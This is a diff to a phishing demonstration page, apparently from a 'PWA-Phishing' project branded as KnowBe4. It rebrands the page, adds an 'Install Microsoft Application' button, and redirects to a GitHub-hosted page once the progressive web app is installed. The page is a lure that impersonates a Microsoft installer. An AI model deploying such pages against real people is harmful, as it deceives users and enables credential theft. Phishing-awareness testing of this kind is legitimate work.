@@ -59,9 +59,9 @@
 </head>
 <body>
   <div class="circle">
-    <img src="mrd0x.png" style="width:130px" alt="Profile Image">
+    <img src="https://github.com/KEKB4/PWA-Phishing/blob/main/kb4.png" style="width:130px" alt="Profile Image">
   </div>
-  <div class="title">mr.d0x</div>
+  <div class="title">Knowbe4</div>
   <button id="installButton">
     <img src="kb4.svg" alt="Knowbe4 Logo">
     Install Microsoft Application
@@ -108,7 +108,7 @@
 
     window.addEventListener('appinstalled', (evt) => {
       console.log('PWA was installed');
-      // Redirect to /mrd0x.html
+      // Redirect to https://github.com/KEKB4/PWA-Phishing/blob/main/knowbe4.html
       redirectToMrd0x();
     });
 
@@ -118,12 +118,12 @@
         navigator.serviceWorker.getRegistration().then((registration) => {
           if (registration) {
             registration.update().then(() => {
-              window.location.href = '/mrd0x.html';
+              window.location.href = 'https://github.com/KEKB4/PWA-Phishing/blob/main/knowbe4.html';
             });
           }
         });
       } else {
-        window.location.href = '/knowbe4.html';
+        window.location.href = 'https://github.com/KEKB4/PWA-Phishing/blob/main/knowbe4.html';
       }
     }
   </script>
